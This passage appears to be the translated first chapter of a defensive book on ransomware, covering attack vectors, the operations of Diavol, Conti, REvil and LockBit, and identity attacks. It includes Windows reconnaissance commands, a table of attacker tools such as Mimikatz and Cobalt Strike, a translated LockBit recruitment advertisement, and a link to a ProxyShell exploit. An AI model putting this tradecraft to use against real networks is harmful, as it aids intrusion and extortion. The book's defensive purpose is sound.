- '# 第 1 部分：勒索软件基础


  本部分概述了勒索软件、其工作原理，以及攻击中经常使用的不同攻击向量和战术。


  它还探讨了不同的勒索软件团伙，并重点介绍了在现实场景中被使用过的最常见的攻击向量。


  本部分包含以下章节：


  - *第 1 章，勒索软件攻击向量与威胁态势*

  - *第 2 章，建立安全基础*

  '
- "## 勒索软件攻击向量与威胁态势\n\n在本章中，我们将首先介绍勒索软件是什么、攻击是如何进行的、攻击者使用的一些主要攻击向量的概述，以及勒索软件团伙是如何运作的。然后，我们将对一些最知名的勒索软件团伙，如\
  \ Conti、LockBit 和 Sodinokibi，进行更深入的介绍，以及它们历史上是如何执行攻击的。\n\n勒索软件有许多复杂的形式。在过去的 5 年里，我们看到勒索软件变得更加复杂。这需要更高水平的处理人员来应对这些威胁行为者。因此，在本章中，我们将更好地了解不同的攻击战术以及攻击是如何进行的。这将在后续章节中得到扩展，当我们介绍不同用于防范此类攻击的对策时。\n\
  \n在本章中，我们将涵盖以下主要主题：\n\n- 勒索软件和攻击向量\n- 攻击和勒索战术\n- 一些勒索软件运营商的概述\n- 身份型攻击是如何进行的\n-\
  \ 如何利用漏洞发起攻击\n- 如何监控漏洞\n\n了解这些主题可以帮助我们更好地应对并做好准备。这些都是我们工具箱中必备的知识和技能。\n\n### 勒索软件的演变\n\
  \n勒索软件是一种历史上被设计用来加密数据并使依赖它的系统无法使用的恶意软件。恶意行为者随后要求支付赎金以换取解密数据。\n\n在 2021 年，我们看到了勒索软件攻击数量的巨大增长，许多公司面临其\
  \ IT 基础设施和数据被加密的情况，许多数据还被不同的勒索软件团伙窃取。在我所在的挪威，我们在过去一年里也看到了许多大型组织遭到勒索软件攻击，这也影响到了挪威民众。以下是\
  \ 2021 年在挪威遭到勒索软件攻击的一些组织：\n\n- **Nordic Choice Hotels**：这是斯堪的纳维亚最大的酒店连锁之一。当它们遭到攻击时，需要改用人工办理入住手续。\n\
  - **Amedia**：这是挪威第二大新闻出版商，出版超过 90 家报纸。当它们遭到攻击时，报纸生产被迫停止了超过一周。\n- **Nortura**：这是挪威最大的食品生产商之一，因此当它遭到勒索软件攻击时，意味着农民无法将动物送去加工。\n\
  \n此外，在其他国家也发生了许多高调的攻击，例如美国 Colonial Pipeline 的攻击以及 MSP 软件提供商 Kaseya 的攻击，后者最终影响了全球近\
  \ 1,500 名客户。\n\n在 Colonial Pipeline 遭到攻击后，美国政府实施了新的报告法规，这意味着在美国遭到勒索软件攻击的组织必须向 FBI、CISA\
  \ 或美国特勤局报告事件。\n\n在过去几年里，我们还看到根据 Sophos 的数据，针对医疗保健的勒索软件攻击几乎翻了一番（https://news.sophos.com/en-us/2022/06/01/the-state-of-ransomware-in-healthcare-2022/），然而，针对医疗保健的攻击并非有意为之，因为大多数勒索软件团伙倾向于避免医疗保健企业。2022\
  \ 年，我们看到一些案例，勒索软件团伙免费向组织提供解密密钥，以避免影响可能影响医院等医疗领域患者治疗的系统。\n\nKaseya 的攻击是通过其 **Virtual\
  \ System Administrator (VSA)** 产品进行的，最终影响了瑞典超市连锁 Coop，该连锁在北欧的攻击后被迫关闭 500 家商店。\n\n\
  在 Sophos 进行的一项调查中，他们在 2021 年采访了 5,400 名 IT 决策者，其中约 37% 在过去一年中遭到过勒索软件攻击，这比前一年 51%\
  \ 的数字有了显著下降，令人欣慰。\n\n然而，攻击者的行为也发生了一些显著变化。最有可能的是，攻击数量的减少可能与更少自动化的攻击和更多动手针对性攻击有关。Emsisoft\
  \ 是 ID ransomware（malwarehunterteam.com）背后的安全软件公司，允许我们通过上传勒索软件说明文件来识别哪个勒索软件变种加密了文件。Emsisoft\
  \ 在其网站上发布称，2021 年该服务收到了近 560,000 次提交，比前一年多了 50,000 次。此外，Emsisoft 还估计只有 25% 的受害者会提交到其网站（https://id-ransomware.malwarehunterteam.com/）。\n\
  \n我们还看到了威胁行为者个人参与度的增加。例如，我们看到在圣诞节等节假日附近的攻击有所增加，因为人们通常更紧张，更容易成为网络钓鱼攻击的受害者。\n\n全球许多组织都面临过勒索软件攻击，从统计数据来看，受影响的大型组织数量似乎只是在上升。但勒索软件在过去几年中是否已经演变？\n\
  \n勒索软件主要被攻击者用来利用您基础设施中最薄弱的环节，然后使用某种加密方法加密您的数据和基础设施。一旦加密完成，他们会留下赎金说明并等待。获取原始数据（或能够解密数据）的唯一方法是使用一种数字货币向攻击者购买解密工具。还有其他攻击方法，但我稍后会再谈到。\n\
  \n在赎金说明中，您会得到有关如何联系他们或访问其支持渠道的说明，这些渠道通常隐藏在 Tor 地址之后。当您访问其支持渠道时，一些运营商会提供一些关于发生了什么以及您需要支付多少才能获得解密工具的信息：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_21_0.png)\n\n图 1.1 – 勒索软件运营商聊天支持\n\n\
  勒索软件攻击通常涉及多个团队或人员。许多不同的勒索软件团伙分为较小的团体和附属机构。许多附属机构通常会共同努力获取对环境的访问权限，甚至可能是内部人员。他们将访问权限出售或提供给部署勒索软件的其他团队。利润通常在附属机构和团伙之间分配，并支付一次性费用以获取对环境的访问权限。\n\
  \n附属机构独立运营或作为有组织团体的成员，而一些最知名的勒索软件团伙正在进行积极的招募计划以获取附属机构。\n\n勒索软件攻击者只专注于获取访问权限、加密数据并等待组织联系。在大多数情况下，勒索软件运营商还对您的组织和员工人数有一定的了解，这也会影响赎金费用。\n\
  \n大多数勒索软件运营商托管自助服务门户，并内置聊天支持以获取有关如何支付解密工具的详细信息，该门户只能通过 Tor 网络访问。最知名的团伙倾向于使用 Monero\
  \ 作为首选加密货币，因为许多人认为它是不可追踪的货币。然而，我们也看到其他加密货币被使用。此外，最近的证据表明威胁行为者会为彼此做生意，例如使用洗钱服务使资金无法追踪。\n\
  \n虽然大多数安全专业人士都同意您永远不应支付赎金，但许多人在绝望中支付了赎金以获取文件访问权限并恢复服务。考虑一下替代方案——您的整个基础设施、备份和其他服务都消失了，重建服务需要太多时间，您的公司甚至可能破产。\n\
  \n我们还看到许多组织越来越多地依赖网络保险来支付与勒索软件相关的费用。2021 年上半年，勒索软件占所有网络保险索赔的 75%；这也导致保费大幅上涨。\n\n\
  > **重要说明**\n> \n> 需要注意的是，在 Sophos 于 2021 年进行的一项调查中，对于支付赎金的组织，平均能够恢复的数据量仅接近 65%（https://news.sophos.com/en-us/2021/04/27/the-state-of-ransomware-2021/）。在某些情况下，当您与攻击者协商价格时，一些勒索软件运营商会为您提供免费样本，以向您展示他们拥有解密工具并且可以解密数据。在大多数情况下，这只能解密单个文件或单个虚拟机。在大多数情况下，他们对环境也有良好的映射，并且知道哪些机器正在运行，例如备份服务，因此您很可能只能解密不重要的虚拟机，例如测试服务器。\n\
  \n当您支付赎金时，您要么支付以获取每台机器的解密密钥，要么获取用于整个环境的解密密钥和工具。一旦您获得解密工具的访问权限，解密单台机器可能需要数小时。如果您需要解密整个环境，可以预期需要很长时间。\n\
  \n\n\n\n\n## 利用已知漏洞\n\n这里指的是攻击者利用外部服务中的某种漏洞。这可能包括攻击者试图使用某种形式的**远程代码执行（RCE）**来获得访问权限。在过去几年中，我们看到了许多被用来发起勒索软件攻击的不同漏洞。以下是一些曾遭受这些攻击的产品：\n\
  \n- Citrix ADC\n- Microsoft Exchange\n- Fortinet\n- Pulse VPN\n- SonicWall\n\n>\
  \ **重要说明**\n>\n> 多年来我一直在使用的一个了解已知流量模式的良好来源是 Twitter 上的 Bad Packets，它有一个不错的信息流，会关注当前试图滥用不同服务中易受攻击端点的流量。我建议你将其添加为值得关注的来源：`https://twitter.com/bad_packets`。此外，**网络安全和基础设施安全局（CISA）**\
  \ 已经编制了一份已知被利用漏洞的列表，可在此处找到：`https://www.cisa.gov/known-exploited-vulnerabilities-catalog`。\n\
  \n去年披露的最大漏洞之一是 ProxyShell，它利用了 Microsoft Exchange 中的多个漏洞。许多安全研究人员迅速使用简单的 Python/PowerShell\
  \ 脚本提供了概念验证漏洞利用代码，如下所示：`https://github.com/horizon3ai/proxyshell`。\n\n这个漏洞链可让攻击者访问\
  \ Exchange 中存储的邮箱，并提供对 Exchange 客户端访问服务器的 Web shell 访问权限。\n\n漏洞不仅用于初始访问，还用于横向移动。2021\
  \ 年夏天，一个新的漏洞被披露，它是 Windows 中 Print Spooler 服务（也称为 PrintNightmare）的一个弱点，该漏洞允许攻击者在操作系统上执行特权文件操作。\n\
  \n这意味着攻击者可以在本地和远程以系统权限运行任意代码。成功入侵最终用户机器的攻击者可以利用此漏洞进一步访问基础设施，例如运行 Print Spooler 服务的域控制器。\n\
  \n## 通过撞库攻击访问\n\n撞库攻击是指攻击者自动化注入被盗的用户名和密码组合，或尝试登录不同的在线服务。大多数最终用户都有惯性，倾向于在众多第三方服务或网站上重用用户名和密码。当这些第三方服务被攻破时，最终用户的信息——或者更糟，凭据——就会泄露。在许多情况下，攻击者会深入研究这些攻击中的不同数据源，看看能否找到任何可重用的凭据，并尝试访问组织可能拥有的任何外部服务。\n\
  \n检查你的凭据是否泄露的一个好方法是使用在线服务 https://haveibeenpwned.com，你可以在其中输入电子邮件地址，它会检查不同的数据源，以确定你的信息是否泄露以及包含在哪些类型的数据源中。\n\
  \nhaveibeenpwned.com 还提供免费的域名通知服务，这意味着如果你的域名中的某个用户出现在数据泄露事件中，你会收到通知。我也强烈推荐你注册该服务。\n\
  \n其他服务也可以提供类似功能来检测用户名或密码是否已被泄露，例如：\n\n- F-Secure ID PROTECTION\n- Google Password\
  \ Manager\n- Microsoft Edge Password Monitor\n\n除此之外，许多攻击者还在实施以窃取凭据为目的的网络钓鱼攻击，例如将最终用户引导至伪造的\
  \ Office 365 网站以收集用户名和密码。\n\n一种越来越常见的新型攻击方法是对 Azure Active Directory (AD) 进行 OAuth\
  \ 网络钓鱼，攻击者会发送伪造的 Microsoft 365 登录页面。当用户点击链接以授予应用程序访问权限时，最终用户会看到一个“请求的权限”对话框：\n\n\
  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_27_0.png)\n\n图 1.3 – 网络钓鱼攻击的 OAuth 权限屏幕\n\
  \n如果用户点击“接受”，攻击者将能够访问其在 Office 365 中的个人资料，根据授予的权限类型，这可能还包括对电子邮件和文件的访问权限。\n\n## 通过暴力破解攻击访问\n\
  \n我们见到的最常见的攻击媒介之一是对配置错误服务进行暴力破解攻击，例如攻击公开暴露且启用了远程桌面协议（RDP）的 Windows 服务器。这也可能是任何暴露的、安全机制薄弱的服务，例如缺少\
  \ MFA（RDP 默认没有 MFA），因此容易受到攻击。\n\n在我合作的一个客户那里，最初的入侵点是 Azure 中一台暴露的 Windows Server，它有公共\
  \ IP 地址并启用了 RDP。由于该机器还加入了域，并且本地管理员帐户密码较弱，攻击者没花多少时间就猜出了正确的用户名和密码组合，从而进入了环境。\n\n正如我们所见，在基于云的环境中，攻击者通常有一组预定义的凭据，用于针对已知\
  \ IP 范围进行暴力破解攻击。Azure 环境通常使用诸如 AZADMIN/AZUREADMIN/AZURE 等用户名与不同的密码组合。自动化攻击通常会在机器在\
  \ Azure 上线后几分钟内开始。\n\n## 通过被入侵的工作站或最终用户机器访问\n\n勒索软件攻击最常见的入口点之一是通过被入侵的最终用户机器。这通常发生在用户打开收到的附件，或者访问网站并从中运行某种可执行文件时。\n\
  \n这主要是因为最终用户收到了来自网络钓鱼电子邮件的恶意附件，或通过路过式下载（drive-by downloads）中招。恶意内容可以是包含脚本或其他恶意内容的\
  \ Word 文档，或带有宏的 Excel 文档。\n\n这些网络钓鱼电子邮件通常以短期活动形式发送。在 60 天内，Akamai 观察到超过 20 亿个与恶意活动相关的唯一域名。其中，近\
  \ 90% 的域名存活时间不到 24 小时，94% 的域名存活时间不到 2 天。因此，使用 DNS 保护服务来阻止它们变得极其困难。Palo Alto 还表示，大多数（接近\
  \ 70%）新注册域名（NRDs）与恶意或可疑流量相关，平均每年创建 14 万个域名。\n\n这些钓鱼邮件和附件要么使用恶意脚本，要么使用宏，通常利用漏洞来获得机器访问权限。在大多数情况下，这要求最终用户打开附件并启用内容或触发宏。然而，在\
  \ 2021 年 8 月，Microsoft 发现少量攻击使用了 MSHTML 中的一个 RCE 漏洞，MSHTML 是 Windows 内置的 HTML 引擎。\n\
  \n这个特定漏洞只需用户在 Windows 资源管理器中查看该文件或文档，即可触发有效负载运行。\n\n在 COVID 疫情和人们居家办公期间，我看到的另一个例子是，许多员工会将工作机器直接连接到家庭路由器，从而从\
  \ ISP 获得一个公共 IP 地址。这意味着，如果他们的客户端机器启用了 RDP，就很容易受到暴力破解攻击。除非有特殊需求，否则请确保不要启用 RDP/SMB，并设置好出站防火墙规则。\n\
  \n## 勒索软件是如何运作的？\n\n最糟糕的事情发生了——有人成功入侵了你的基础设施并加密了你的数据。这是怎么发生的？他们是怎么进来的？\n\n让我们探讨一些不同类型勒索软件背后的机制。\n\
  \n### Diavol 勒索软件\n\nDiavol 是一种勒索软件，据推测被一个名为 Wizard Spider 的组织使用，最初由 FortiGuard\
  \ Labs 于 2021 年 6 月发现。它使用已知恶意软件 BazarLoader 来窃取信息并投放恶意软件有效负载。\n\n\n\n\n\n初始有效载荷通过钓鱼攻击被投递到一个端点，其中包含一个指向\
  \ OneDrive URL 的链接。使用 OneDrive 的原因在于它通常提供一个可以绕过大多数防火墙和垃圾邮件过滤器的 URL。\n\nBazarLoader\
  \ 倾向于使用常见的云服务以能够绕过安全过滤器。然后，用户会被指示下载一个包含 ISO 文件的 ZIP 文件，以允许其绕过下载文件时的任何安全机制。当用户在其文件系统上挂载\
  \ ISO 文件时，它会挂载一个 LNK 和 DLL 文件。一旦用户执行 LNK 文件，BazarLoader 感染就会启动。\n\n最初，与 BazarLoader\
  \ 一样，它首先通过使用以下等脚本和命令对 Windows 环境进行内部侦察：\n\n- Net group \"Domain Computers\" /domain\n\
  - Nltest /domain_trust /all_trusts\n- Net localgroup \"administrator\"\n\n执行侦察后，BazarLoader\
  \ 使用 **Background Intelligent Transfer Service (BITS)** 下载一组 DLL 文件，其中包含 Cobalt\
  \ Strike，并开始与操作员的 Cobalt Strike 服务器通信。然后，从受损机器上，他们通常会运行第二阶段的脚本，使用 AdFind 等工具，然后使用\
  \ BAT 脚本转储本地凭据。\n\n攻击者还倾向于使用 Rubeus 等工具执行 Kerberoast，这用于在域中收集使用的 **Ticket Granting\
  \ Server (TGS)** 票据。\n\n一旦他们设法访问文件服务器，他们会使用 AnyDesk 和 FileZilla 等工具从环境中窃取数据。然后，他们会转移到更关键的系统，例如备份服务器和域控制器。\n\
  \n一旦他们执行了数据外泄并获得了对包括备份系统在内的基础设施核心部分的访问权限，他们就会触发初始有效载荷。\n\n最终有效载荷通常通过 RDP 使用脚本来触发加密过程。为了最大化效果，勒索软件会终止可能锁定文件访问的进程，例如\
  \ Office 应用程序和数据库服务。此外，他们还尝试停止可能锁定文件访问的服务，例如 `httpd.exe`、`sqlserver.exe`、`chrome.exe`\
  \ 等。\n\n他们还使用脚本查找连接到主机机器的所有驱动器。此外，他们会停止 **Volume Shadow Copy Service (VSS)** 并确保在运行加密过程之前删除\
  \ VSS 快照。\n\n对于每台被入侵的机器，Diavol 都会创建一个唯一标识符，然后将其传回 C2 地址。\n\n## Initial Access\n\
  - Phishing Email\n- Download Malicious Attachment\n- Run Document Triggering BazarLoader\
  \ Loader\n\n## Reconnaissance and Credential Dump\n- Windows Discovery Scripts\n\
  - Dumping Registry Hives\n- Establishing Cobalt Strike C2\n\n## Lateral Movement\
  \ and Persistence\n- Kerberoast\n- Lateral Movement Using RDP\n- File Server Persistence\
  \ and Exfiltration\n\n## Payload\n- RDP and Run Payload\n\nFigure 1.4 – Overview\
  \ of the attack pattern for Diavol\n\n该概述显示了 Diavol 攻击中的不同阶段和攻击模式，其中最终有效载荷通常使用 RDP\
  \ 分发到基础设施的所有部分。\n\n## Conti ransomware\n\nConti 最早于 2020 年 5 月出现，并在 2021 年成为最常见的勒索软件变种之一。主要访问点大多是通过\
  \ spear-phishing 活动进行的，在大多数情况下，利用恶意 JavaScript 代码，该代码首先使用 TrickBot、IcedID 或 BazarLoader\
  \ 将恶意软件加载器投递到基础设施中。\n\n他们也曾使用 RDP 进行暴力攻击。\n\n现在，与 Diavol 和 BazarLoader 一样，Conti\
  \ 使用各种不同的脚本进行侦察，例如 `nltest`、`whoami` 和 `net.exe`。然后，他们使用 Cobalt Strike 将权限提升到本地系统并与\
  \ C2 服务器建立通信。\n\n然后，攻击者使用不同的工具扫描网络并收集信息，例如 AdFind、Router Scan、SharpChrome 和 Seatbelt。他们还使用\
  \ Kerberoast 和 Mimikatz 等工具收集管理员哈希或提取密码。\n\n他们花费时间查看本地用户账户配置文件，寻找可用于勒索要挟的重要数据或文件，例如以下内容：\n\
  \n- Outlook (OST files)\n- Login data stored within Chrome\n- KeePass/LastPass information\n\
  - FileZilla (sitemanager.xml)\n- Local OneDrive folders\n\n他们也曾使用 Zerologon、PrintNightmare\
  \ 和 EternalBlue 等常见的基于 Windows 的漏洞来在环境中获得提升的权限。\n\nCisco Talos 安全研究人员获得了来自不满内部人员的泄露\
  \ Conti 文档，其中显示了攻击模式、脚本以及如何使用不同的工具。您可以在此处查看摘要的 PDF 文件：https://s3.amazonaws.com/talos-intelligence-site/production/document_files/files/000/095/639/original/Conti_playbook_translated.pdf?1630583757。\n\
  \n一旦他们获得了提升的权限，他们就会使用 PsExec（微软 Sysinternals 套件的一部分）在网络中的大多数系统上复制并执行 Cobalt Strike\
  \ Beacon。一旦他们获得了对域控制器的访问权限，他们就会使用内置服务例如 Group Policy 来禁用 Defender 服务以避免被检测到。\n\n\
  完成之后，攻击者运行最终有效载荷，与 Diavol 一样，这将停止许多可能在操作系统上锁定不同文件的内置服务，例如以下内容：\n\n- Microsoft Exchange\n\
  - Microsoft SQL\n- Acronis Backup\n- Backup Exec\n\n大多数勒索软件还内置了一个在加密过程中会白名单的文件夹列表。这是为了确保在数据被加密后系统仍能继续运行。该列表在大多数情况下是静态的，包含以下等文件夹：\n\
  \n- AppData\n- Program Files\n- Boot\n- Windows\n- WinNT\n\n然而，如果您有不同的分区布局或数据，例如域控制器的数据库存储在另一个分区上，例如，它将被加密。Conti\
  \ 还会跳过一些文件扩展名，例如 .exe、.dll、.sys 和 .lnk。加密完成后，所有文件都具有 .CONTI 扩展名，并且在每个文件夹中还会创建勒索说明。\n\
  \n## Sodinokibi/REvil ransomware\n\nSodinokibi/REvil 也许是我们名单上最猖獗的勒索软件组织之一。他们是臭名昭著的\
  \ Kaseya VSA 供应链攻击的幕后黑手，他们还对 Travelex 和 JBS Foods 等其他大型公司发动了攻击。JBS Foods，也是世界上最大的肉类生产商，最终向\
  \ REvil 支付了 1100 万美元以恢复对数据的访问。\n\n像前面提到的其他勒索软件运营商一样，REvil 已知使用 IcedID 等恶意软件加载器，以及使用不同的暴力攻击并利用已知漏洞，例如\
  \ FortiOS VPN、Pulse VPN、BlueGate、Citrix 和 Oracle WebLogic Server，等等。\n\n他们也是最早开始针对\
  \ VMware ESXi 虚拟机的勒索软件运营商之一。他们使用内置的 ESXCLI 命令行强制停止虚拟机，然后直接在 VMware 数据存储级别加密数据。\n\
  \n对于我曾处理过的一位因 Sodinokibi 而受害的客户，初始入口点是通过 Azure 中的一台受损虚拟机（通过 RDP），然后被用来访问虚拟基础设施。\n\
  \n像其他人一样，REvil 也有他们用于侦察网络的一系列脚本和实用程序。有一样东西让他们与众不同的是，他们能够在带网络的安全模式下重启虚拟机，并且仍然能够运行其有效载荷。优势在于他们能够在重启回默认模式之前运行有效载荷并禁用机器上的任何\
  \ EDR 服务。\n\n幸运的是，在 2022 年初，俄罗斯政府应美国要求逮捕了 REvil 勒索软件组织的多名关键资源；您可以在此处阅读更多相关信息：https://www.wsj.com/articles/russia-says-it-raided-prolific-ransomware-group-revil-with-arrests-seizures-11642179589。\n\
  \n## LockBit ransomware\n\n截至撰写本文时，最常见的勒索软件组织之一是 LockBit，自 2019 年出现以来，它已影响了许多大型组织，例如\
  \ Accenture，该公司在 2021 年底遭到攻击。\n\n\n\n\n\nLockBit 除其他 **勒索软件即服务 (Ransomware as a\
  \ Service, RaaS)** 运营商外，使用了一个众所周知的俄语网站论坛 XSS 来宣传其附属计划。然后，XSS 运营商在其网站上禁止了所有勒索软件主题，LockBit\
  \ 开始使用自己的基础设施来宣传其附属计划。\n\nLockBit 已知会招募内部人员通过其附属计划获得基础设施访问权限，用 *数百万美元* 换取访问有价值公司数据的权限：\n\
  \n## [勒索软件] LockBit 2.0 是一个附属计划。\n\n附属计划 LockBit 2.0 暂时重新开放合作伙伴招募。\n\n该计划自 2019\
  \ 年 9 月起运行，原生使用 C 和 ASM 语言设计且无任何依赖。加密部分通过完成端口（I/O）实现，加密算法为 AES + ECC。在两年时间内无人能够解密它。\n\
  \n无与伦比的优势是加密速度和自传播功能。\n\n你唯一需要做的是获得对核心服务器的访问权限，其余所有工作 LockBit 2.0 都会完成。启动会在域网络的所有设备上实现，前提是域控制器具有管理员权限。\n\
  \n简要功能集：\n- Tor 系统中的管理员面板；\n- 通过 Tor 与公司通信，带 PUSH 通知的聊天室；\n- 自动测试解密；\n- 自动解密器检测；\n\
  - 本地子网中的端口扫描器，可检测所有 DFS、SMB、WebDav 共享；\n- 在运行时无需脚本即可在域网络中自动分发；\n- 终止干扰服务和进程；\n-\
  \ 阻止可能破坏加密过程的进程启动；\n- 设置文件权限并移除阻止属性；\n- 删除卷影副本；\n- 创建隐藏分区，拖放文件和文件夹；\n- 清除日志和自我清除；\n\
  - 窗口化或隐藏运行模式；\n- 通过 Wake-on-Lan 启动已关闭的计算机；\n- 在网络打印机上打印勒索要求；\n- 适用于所有版本的 Windows\
  \ 操作系统；\n\n图 1.5 – 显示 LockBit 招募程序的屏幕截图\n\nLockBit 在其网站上宣传，其数据加密方法比其他勒索软件变种快得多，并且他们对加密方面的编程感到非常自豪。\n\
  \n此外，其勒索软件（像大多数其他勒索软件变种一样）在俄语国家和系统语言设置为俄语的基础设施中不运行。在某些情况下，内置检测机制会在系统运行俄语时通知运营商或停止信息收集过程。\n\
  \n他们使用的操作模式与我们谈到的其他组织类似；然而，在过去一年中他们也发展了很多。2021 年 10 月，也有传言称他们开发了首个 LockBit Linux-ESXi\
  \ 变种。\n\nESXi 勒索软件并非新事物，但此新变种同时针对 vCenter 和 VMware ESXi，并利用漏洞来获得对 VMware 环境的访问权限。\n\
  \n## 最新增添\n\n现在，在 2023 年，我们看到出现了包含来自旧组织附属或成员的新威胁组织。\n\n我们有以下组织：\n- Royal\n- RansomHouse\n\
  - BlackCat\n- ClopLeaks\n\n还有数十个之多。在社交媒体上，我们每天可以看到新的受害者被发布。以下是可以用来跟踪这些不同威胁组织的来源：\n\
  - https://twitter.com/TMRansomMonitor\n- https://twitter.com/RansomwareNews\n\n\
  由于我们看到新受害者受影响的频率很高，使用这些来源来了解当前趋势并了解哪些组织最活跃非常重要。\n\n## 整体概览\n\n现在我们已经查看了一些主要攻击向量以及更详细的一些勒索软件变种，我想描绘一个更大的图景并提供一些重要的考虑因素。\n\
  \n让我们从勒索软件攻击的第一阶段开始，即初始入侵：\n- 在大多数情况下，钓鱼攻击被用来诱使用户点击恶意附件以运行特定有效载荷，从而在受感染端点上触发恶意软件，例如\
  \ BazarLoader。\n- 其他攻击从利用易受攻击的端点开始，例如 Exchange、RDP 或其他可用的第三方服务。我们看到在附属方获得对组织的访问权限后，该访问权限会以\
  \ 5,000 美元到 50,000 美元不等的价格出售给威胁行为者，具体取决于访问类型。\n\n一旦攻击者成功获得访问权限，第二阶段就开始了，即收集信息：\n\
  - 获得端点访问权限后的初始阶段是评估环境，使用内置脚本和工具获取有关机器/网络/用户/数据的信息。如果他们以后想将访问权限出售，这些信息也用于收集他们已获得访问权限的组织类型的证明。\n\
  \n下表总结了一些勒索软件运营商用于评估环境并尝试进一步访问环境的常用工具和脚本。\n\n需要指出的是，这不是一个完整列表；我只是列出了我在不同客户场景中遇到的一些工具。然而，它能更好地了解黑客用于收集信息的工具：\n\
  \n| ADFind | Atera | Invoke- SMB AutoBrute | Advanced IP Scanner |\n| SharpView\
  \ | BloodHound | Net-GPPPassword | MSSQLUDP Scanner |\n| Net Use | DCSync | SharpChrome\
  \ | Zero.exe |\n| NetScan | Router Scan | BITSAdmin | Spashtop Remote |\n| Esentutl\
  \ | Mimikatz | Invoke-ShareFinder | SWLCMD |\n| WMI C | Cobalt Strike | PowerView\
  \ | UAC-TokenMagic |\n| Nltest | WDigest | Process Hacker | Kerberoast |\n| AnyDesk/TeamViewer\
  \ | Getuin | FileZilla SFTP | Seatbelt |\n\n图 1.6 – 常用工具和脚本概览表\n\n除了前述表中提到的一些脚本/工具外，攻击者还使用许多内置功能在环境中导航。这些功能可以是\
  \ RDP 和文件资源管理器等。一些运营商也已知使用组策略管理在同一时间对多台机器执行操作。\n\n截至撰写本文时，大多数勒索软件针对的是基于 Windows\
  \ 的环境，因为大多数企业在数据中心的大部分区域都在运行 Windows。这包括 Active Directory、文件服务器和 SQL 服务器，以及 Windows\
  \ 端点。然而，我们也看到勒索软件运营商转向新的目标类型。还有新的勒索软件变种出现，针对其他服务，例如 NAS 服务。其中一个新变种称为 Deadbolt，针对的是\
  \ QNAP NAS 设备。也有针对 Linux 和 Mac OS X 的变种，因此这是我们都应关注的问题。\n\n## 身份攻击\n\n现在我们已经查看了不同的攻击向量以及一些勒索软件变种及其攻击模式，我想更深入地探讨一些常见的攻击向量，从身份攻击开始。\n\
  \n随着向 Microsoft 365 等公共云服务的迁移，身份攻击变得越来越常见。\n\nSaaS 服务有一个共同属性，即它们可从互联网访问，这意味着 *任何人*\
  \ 都可以访问这些服务。\n\n如前所述，常见的攻击向量之一是凭证填充，攻击者尝试使用从泄露中获取的用户名和/或电子邮件地址列表登录。\n\n以下屏幕截图显示了我们其中一个租户的登录尝试，其中每天从多个位置看到大量登录尝试是典型的。\n\
  \n此屏幕截图取自我们的 Azure AD 登录日志，并使用 Log Analytics 解析（我将在 *第 7 章《使用 Azure 信息保护和数据保护保护信息》中介绍*）：\n\
  \n|  |  |  |  |\n|---|---|---|---|\n| > | 2/3/2022, 11:13:10.434 AM | Sign-in was\
  \ blocked because it came from an IP address with malicious activity | RU |\n| >\
  \ | 2/3/2022, 11:14:14.654 AM | Sign-in was blocked because it came from an IP address\
  \ with malicious activity | RU |\n| > | 2/3/2022, 11:15:06.893 AM | Sign-in was\
  \ blocked because it came from an IP address with malicious activity | RU |\n| >\
  \ | 2/3/2022, 11:15:10.940 AM | Sign-in was blocked because it came from an IP address\
  \ with malicious activity | RU |\n| > | 2/3/2022, 11:15:53.489 AM | Sign-in was\
  \ blocked because it came from an IP address with malicious activity | RU |\n| >\
  \ | 2/3/2022, 11:15:03.212 AM | Sign-in was blocked because it came from an IP address\
  \ with malicious activity | RU |\n| > | 2/3/2022, 11:15:49.949 AM | Sign-in was\
  \ blocked because it came from an IP address with malicious activity | RU |\n| >\
  \ | 2/3/2022, 11:16:13.716 AM | Sign-in was blocked because it came from an IP address\
  \ with malicious activity | RU |\n| > | 2/3/2022, 11:16:18.022 AM | Sign-in was\
  \ blocked because it came from an IP address with malicious activity | RU |\n| >\
  \ | 2/3/2022, 11:16:06.503 AM | Sign-in was blocked because it came from an IP address\
  \ with malicious activity | RU |\n\n图 1.7 – Office 365 阻止的身份验证尝试概览\n\n现在，由于这是 Azure\
  \ AD，Microsoft 已内置不同 IP 过滤器来阻止来自已知恶意 IP 地址的登录尝试，这意味着它们在尝试身份验证前就被阻止了。然而，这只是显示了在短时间内有多少身份验证流量进入。\n\
  \n\n\n\n\n那么，它们是从哪里来的呢？攻击者是如何找到他们试图登录的用户账户的？\n\n在许多情况下，攻击者拥有不同的抓取器和脚本，会爬取网站以收集他们能找到的所有电子邮件地址。这也可能包括从现有数据泄露中收集到的电子邮件地址。\n\
  \n一个了解凭据是从哪里被窃取的好方法是，检查受影响的电子邮件地址是否在 https://haveibeenpwned.com 上。以下截图显示了电子邮件地址未被泄露的结果：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_37_0.png)\n\n图 1.8 – 显示未找到用户信息的资料\n\n\
  然而，如果信息在服务可访问的某个数据泄露中被找到，则会出现以下结果：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_38_0.png)\n\
  \n图 1.9 – 显示用户信息在泄露中被找到的资料\n\n在某些情况下，服务不会显示密码已被收集，而是仅显示收集了电子邮件信息。这很可能是因为数据来源在 haveibeenpwned.com\
  \ 上不可用，或者攻击者有机器人会抓取或爬取网站以获取电子邮件地址等信息。\n\n甚至网上还有免费服务可以用来从 URL 中提取电子邮件，例如 Specrom\
  \ Analytics（https://www.specrom.com/extract-emails-from-url-free-tool/）或使用一个简单的\
  \ Python 脚本也能做到同样的事情。然后，我们可以比较我们收到多次身份验证尝试的用户账户是否可以从公共网站上轻松搜索到。\n\n减少针对用户身份的垃圾邮件和暴力攻击的一种方法是限制可用的公共信息量。\n\
  \n例如，如果你的企业网站发布在 **Web Application Firewall (WAF)** 后面，你就可以根据用户代理来阻止流量。\n\n用户代理是一种身份形式，软件（浏览器）借此向\
  \ Web 服务器标识自身。如今大多数常用浏览器都使用用户代理，例如，Mozilla/5.0 (Windows NT 10.0; Win64; x64), AppleWebKit/537.36\
  \ (KHTML, like Gecko), Chrome/97.0.4692.99, Safari/537.36, 和 Edge/97.0.1072.76。\n\
  \n## 漏洞是如何被用于攻击的？\n\n那么，在我们更仔细地研究了攻击者如何通过抓取、钓鱼或凭据填充等方式收集我们终端用户的信息之后，我们将更仔细地研究一些不同勒索软件运营商在攻击中已知使用的漏洞。在本节后面，我将介绍你如何监控针对你服务的漏洞。\n\
